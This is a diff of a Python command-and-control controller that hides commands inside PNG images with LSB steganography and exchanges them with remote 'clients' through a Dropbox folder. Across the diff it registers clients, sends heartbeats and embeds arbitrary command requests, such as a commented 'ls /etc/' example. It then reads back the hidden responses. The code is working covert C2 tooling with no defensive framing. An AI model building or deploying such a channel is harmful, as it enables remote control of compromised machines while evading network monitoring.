@@ -2,18 +2,22 @@ import dropbox
 import sys
 import select
 import time
-from datetime import datetime
+from datetime import datetime, timedelta
 from stegano import lsb
 from randimage import get_random_image
 import io
+import os
 import matplotlib
 
 
-#in miliseconds
-HEARTBEAT_PERIOD = 300000
+HEARTBEAT_PERIOD = 180
 
-def current_time():
-    return round(time.time() * 1000)
+CHECK_PERIOD = 30
+
+TIMEOUT = HEARTBEAT_PERIOD*4
+
+tmp_path = None
+backup_path = None
 
 def current_datetime():
     return datetime.now().strftime("%d/%m/%Y %H:%M:%S")
@@ -45,7 +49,7 @@ def print_prompt():
 
 def handle_client_selection(clients):
     print("\nSelect client name for sending commands")
-    for i, client in enumerate(clients):
+    for i, client in enumerate(list(clients)):
         print(str(i) + " " + client)
     print("Type 0-" + str(len(clients)-1) + " to select a client")
 
@@ -89,56 +93,130 @@ def handle_command_selection(clients):
     return -2
 
 
-def send_heartbeat(dbx):
-    print(current_datetime() + " Sending heartbeat")
-    files = []
+def send_heartbeat(dbx, clients):
+    #print(current_datetime() + " Sending heartbeat")
     for entry in dbx.files_list_folder('/art').entries:
-        dbx.files_download_to_file("./" + entry.name, entry.path_lower)
+        if not entry.name in clients.keys():
+            continue
+        print(current_datetime() + " Sending heartbeat to " + entry.name)
+        dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)
+
+        execute_command(dbx, 'heartbeat', entry.name)
 
 
 def execute_command(dbx, command, client):
-    header = current_datetime() + "|REQUEST|" + command + "|" + client + "|;"
+    header = current_datetime() + "|REQUEST|" + command + "|;"
     print(header)
      
     for entry in dbx.files_list_folder('/art').entries:
         if entry.name == client:
-            dbx.files_download_to_file("./" + entry.name, entry.path_lower)
+            dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)
 
-    message = lsb.reveal(client, lsb.generators.eratosthenes())
+    message = lsb.reveal(tmp_path + client, lsb.generators.eratosthenes())
     message += header 
-    secret = lsb.hide(client, message,  lsb.generators.eratosthenes())
+    secret = lsb.hide(tmp_path + client, message,  lsb.generators.eratosthenes())
 
     buf = io.BytesIO()
     secret.save(buf, format='PNG')
-    dbx.files_upload(buf.getvalue(), '/art/test_' + client)
+    dbx.files_upload(buf.getvalue(), '/art/' + client, mode=dropbox.files.WriteMode.overwrite)
 
-""" if __name__ == "__main__":
-    if len(sys.argv) != 2:
+
+def process_files(dbx, last_check, clients):
+    for entry in dbx.files_list_folder('/art').entries:
+        if not entry.name in clients.keys():
+            continue
+
+        dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)
+
+        message = lsb.reveal(tmp_path + entry.name, lsb.generators.eratosthenes())
+
+        print('Split')
+        print(message.split(';'))
+        for line in message.split(';')[:-1]:
+            fields = line.split('|')
+            #print(fields)
+            response_time = datetime.strptime(fields[0], "%d/%m/%Y %H:%M:%S")     
+            print("Received")
+            print(fields)           
+            if last_check < response_time and fields[1] == 'RESPONSE':
+                if fields[2] == 'heartbeat' or fields[2] == 'register':
+                    print("Heartbeat detected")
+                    clients[entry.name] = response_time
+                else:
+                    print("Content ")
+                    print(fields[3])
+
+
+def init_clients():
+    clients = dict()
+    for entry in dbx.files_list_folder('/art').entries:
+        dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)
+
+        message = lsb.reveal(tmp_path + entry.name, lsb.generators.eratosthenes())
+
+        print(message.split(';'))
+        for line in message.split(';')[:-1]:
+            fields = line.split('|')
+            clients[entry.name] = datetime.strptime(fields[0], "%d/%m/%Y %H:%M:%S")
+
+    return clients
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
         print("Error - Invalid Call")
-        print("Usage: python3", sys.argv[0], "APP_ACCESS_TOKEN")
+        print("Usage: python3", sys.argv[0], "APP_ACCESS_TOKEN TMP_DIR_PATH BACKUP_DIR_PATH")
     else:
+        tmp_path = sys.argv[2]
+        backup_path = sys.argv[3]
+        for path in [tmp_path, backup_path]:
+            if not os.path.exists(path):
+                os.makedirs(path)
+
         dbx = init(sys.argv[1])
+        
         #secret = lsb.hide("./cute_in.png", "Hello world!\n",  lsb.generators.eratosthenes())
         #secret.save("./cute_out.png")
 
-        last_heartbeat = -1
+        clients = init_clients()
 
-        clients = ["ahston", "laudna", "imogen"]
+        print("Registered clients")
+        for k in clients.keys():
+            print(k)
+        print("")
+
+        last_heartbeat = datetime.now() - timedelta(hours=0, minutes=10)
+        last_check = datetime.now() - timedelta(hours=0, minutes=10)
+
         selected_client = -1
 
         while True:
             print("Selected client " + str(selected_client))
-            if abs(last_heartbeat - current_time()) > HEARTBEAT_PERIOD:
-                send_heartbeat(dbx)
-                last_heartbeat = current_time()
-            else:
-              # read command
-              res = handle_command_selection(clients) 
-              if res == -1:
-                  break
-              elif res >= 0:
-                  selected_client = res
- """
+
+            check_diff = datetime.now() - last_check
+            if check_diff.seconds > CHECK_PERIOD: 
+                tmp = datetime.now()
+                process_files(dbx, last_check, clients)
+                last_check = tmp
+
+                for client in list(clients):
+                    client_diff = datetime.now() - clients[client]
+                    if client_diff.seconds > TIMEOUT:
+                        clients.pop(client, None)
+            
+            heartbeat_diff = datetime.now() - last_heartbeat
+            if heartbeat_diff.seconds > HEARTBEAT_PERIOD:
+                tmp = datetime.now()
+                send_heartbeat(dbx, clients)
+                last_heartbeat = tmp
+
+            # read command
+            res = handle_command_selection(clients) 
+            if res == -1:
+                break
+            elif res >= 0:
+                selected_client = res
+
+
 
 """ if __name__ == "__main__":
     img_size = (128,128)
@@ -159,13 +237,13 @@ def execute_command(dbx, command, client):
     print("Out")
     print(lsb.reveal("./test.png", lsb.generators.eratosthenes())) """
 
-if __name__ == '__main__':
+""" if __name__ == '__main__':
     #test_str = "30/12/2023 19:56:59|REQUEST|ls /etc/|ahston|"
     #print(test_str.split('|'))
     dbx = init(sys.argv[1])
     #execute_command(dbx, 'heartbeat', 'test_test.png')
 
-    client = 'test_test_test.png'
+    client = 'incising.png'
      
     for entry in dbx.files_list_folder('/art').entries:
         if entry.name == client:
@@ -173,4 +251,4 @@ if __name__ == '__main__':
 
     message = lsb.reveal(client, lsb.generators.eratosthenes())
     
-    print(message.split('\n'))
+    print(message.split(';')[0].split('|')) """
